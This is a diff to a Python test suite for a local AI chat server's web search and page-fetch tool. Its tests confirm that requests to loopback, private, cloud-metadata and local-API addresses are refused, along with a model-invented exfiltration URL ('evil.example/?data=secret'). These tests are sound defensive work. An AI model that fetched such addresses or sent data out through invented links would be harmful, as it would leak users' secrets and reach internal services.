@@ -222,12 +222,14 @@ def t_tools():
         return {"ok": True, "text": "r", "sources": [], "provider": "x", "model": "m"}
 
     real, cloud.run = cloud.run, stub
+    web_was, server.settings["web"] = server.settings.get("web"), {"enabled": False}   # the cloud provider searches here
     h = H()
     try:
         h.tool_chat({"messages": [{"role": "user", "content": "hi"}], "stream": True}, ("127.0.0.1", PORT - 1), {}, None,
                     [{"type": "function", "function": {"name": "web_search"}}])
     finally:
         cloud.run = real
+        server.settings["web"] = web_was
         fake.shutdown()
     out = h.wfile.getvalue().decode("utf-8", "replace")
     check("%d of 5 tool calls ran" % cloud.MAX_CALLS, len(ran) == cloud.MAX_CALLS, len(ran))
@@ -262,7 +264,96 @@ def t_tuner():
           and cmd[cmd.index("-ub") + 1] == "4096" and cmd[cmd.index("-b") + 1] == "4096", cmd)
 
 
-GROUPS = {"modules": t_modules, "smuggle": t_smuggle, "key": t_key, "guard": t_guard, "phone": t_phone, "tools": t_tools, "tuner": t_tuner}
+def t_web():
+    """The web connector's rules, with the internet stubbed out: nothing is requested from any site."""
+    import webtool as w
+    for u in ("http://127.0.0.1/", "http://localhost/x", "http://192.168.1.1/", "http://100.100.1.2/", "http://[::1]/",
+              "http://169.254.169.254/latest", "https://127.0.0.1:8099/api/key", "file:///c:/x", "ftp://1.1.1.1/", "http://user:pw@1.1.1.1/"):
+        try:
+            w.check_url(u)
+            check("web: %s is refused" % u, False)
+        except w.Refused:
+            check("web: %s is refused" % u, True)
+    check("web: a public address passes", w.check_url("https://1.1.1.1/a b?q=1")[3:] == ("/a%20b?q=1", "1.1.1.1"))
+    check("web: links are found and normalised", w.urls_in("see https://Example.com/a/ and (http://x.org/p?q=1). or https://e.com/w_(x)")
+          == {"https://example.com/a", "http://x.org/p?q=1", "https://e.com/w_(x)"})
+    title, text = w.page_text("<html><head><title>T &amp; t</title><style>x{}</style></head><body><nav>menu</nav><h1>Head</h1>"
+                              "<p>one<br>two</p><script>bad()</script><ul><li>a</li></ul></body></html>")
+    check("web: a page becomes plain text without menus and scripts", (title, text) == ("T & t", "# Head\n\none\ntwo\n\n- a"), (title, text))
+    ddg = ('<a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fa.org%2Fp&amp;rut=1">A <b>page</b></a>'
+           '<a class="result__snippet" href="x">about <b>a</b></a>')
+    check("web: DuckDuckGo results are read", w.parse_ddg(ddg) == [{"title": "A page", "url": "https://a.org/p", "snippet": "about a"}], w.parse_ddg(ddg))
+    brave = ('<div class="snippet" data-type="web"><a href="https://b.org/q" class="l1"><div class="title search-snippet-title x">B page</div></a>'
+             '<div class="content t-primary">about b</div></div>')
+    check("web: Brave results are read", w.parse_brave(brave) == [{"title": "B page", "url": "https://b.org/q", "snippet": "about b"}], w.parse_brave(brave))
+
+    on, got = {"web": {"enabled": True}}, []
+    real = w.search, w.fetch
+    w.search = lambda q: (True, [{"title": "A", "url": "https://a.org/p", "snippet": "s"}], "Stub")
+    w.fetch = lambda u: (got.append(u) or True, "A", "body with http://c.org/next", u)
+    w._cache.clear()
+    try:
+        seen = set()
+        r = w.run(on, "web_fetch", {"url": "https://evil.example/?data=secret"}, seen)
+        check("web: a made-up link is not opened", not r["ok"] and not got, r)
+        check("web: off means off", not w.run({}, "web_search", {"query": "x"}, seen)["ok"])
+        r = w.run(on, "web_search", {"query": "x"}, seen)
+        check("web: a search returns results and their links become openable", r["ok"] and "https://a.org/p" in seen and r["provider"] == "Stub", r)
+        r = w.run(on, "web_fetch", {"url": "https://a.org/p/"}, seen)
+        check("web: a link from the results is opened", r["ok"] and got == ["https://a.org/p/"] and "http://c.org/next" in seen, r)
+        check("web: reading pages can be switched off", not w.run({"web": {"enabled": True, "fetch": False}}, "web_fetch", {"url": "https://a.org/p"}, seen)["ok"])
+
+        # through the chat: 8 searches asked for in one turn, 6 allowed; the user's own link may be opened
+        asked = []
+
+        class Fake(http.server.BaseHTTPRequestHandler):
+            def log_message(self, *a):
+                pass
+
+            def do_POST(self):
+                asked.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
+                self.send_response(200)
+                self.send_header("Content-Type", "text/event-stream")
+                self.end_headers()
+                if len(asked) == 1:
+                    tc = [{"index": 0, "id": "f0", "function": {"name": "web_fetch", "arguments": '{"url": "https://u.org/mine"}'}}]
+                    tc += [{"index": i, "id": "c%d" % i, "function": {"name": "web_search", "arguments": '{"query": "q%d"}' % i}} for i in range(1, 8)]
+                    ev = {"choices": [{"delta": {"tool_calls": tc}}]}
+                else:
+                    ev = {"choices": [{"delta": {"content": "final answer"}}]}
+                self.wfile.write(b"data: " + json.dumps(ev).encode() + b"\n\ndata: [DONE]\n\n")
+
+        fake = http.server.ThreadingHTTPServer(("127.0.0.1", PORT - 1), Fake)
+        threading.Thread(target=fake.serve_forever, daemon=True).start()
+
+        class H(server.Handler):
+            def __init__(self):
+                self.wfile, self.close_connection, self.remote, self.headers = io.BytesIO(), False, False, {}
+                self.requestline, self.request_version, self.command = "POST /v1/chat/completions HTTP/1.1", "HTTP/1.1", "POST"
+                self.client_address, self.path = ("127.0.0.1", 1), "/v1/chat/completions"
+
+        web_was, server.settings["web"] = server.settings.get("web"), {"enabled": True}
+        h = H()
+        try:
+            tools = server.chat_tools()
+            check("web: the chat offers search and page reading", [t["function"]["name"] for t in tools][:2] == ["web_search", "web_fetch"], tools)
+            h.tool_chat({"messages": [{"role": "user", "content": "read https://u.org/mine please"}], "stream": True},
+                        ("127.0.0.1", PORT - 1), {}, None, tools)
+        finally:
+            server.settings["web"] = web_was
+            fake.shutdown()
+        out = h.wfile.getvalue().decode("utf-8", "replace")
+        check("web: a link the user wrote is opened", "https://u.org/mine" in got, got)
+        check("web: %d web calls per reply, the rest are refused" % w.MAX_CALLS, out.count('"status": "done"') == w.MAX_CALLS and "limit of %d per reply" % w.MAX_CALLS in out,
+              out.count('"status": "done"'))
+        tool_msgs = [m["content"] for m in asked[1]["messages"] if m.get("role") == "tool"]
+        check("web: results go back to the model, which then answers", len(tool_msgs) == 8 and "final answer" in out and "never" in asked[1]["messages"][0]["content"], len(tool_msgs))
+    finally:
+        w.search, w.fetch = real
+        w._cache.clear()
+
+
+GROUPS = {"web": t_web, "modules": t_modules, "smuggle": t_smuggle, "key": t_key, "guard": t_guard, "phone": t_phone, "tools": t_tools, "tuner": t_tuner}
 
 if __name__ == "__main__":
     want = sys.argv[1:] or list(GROUPS)
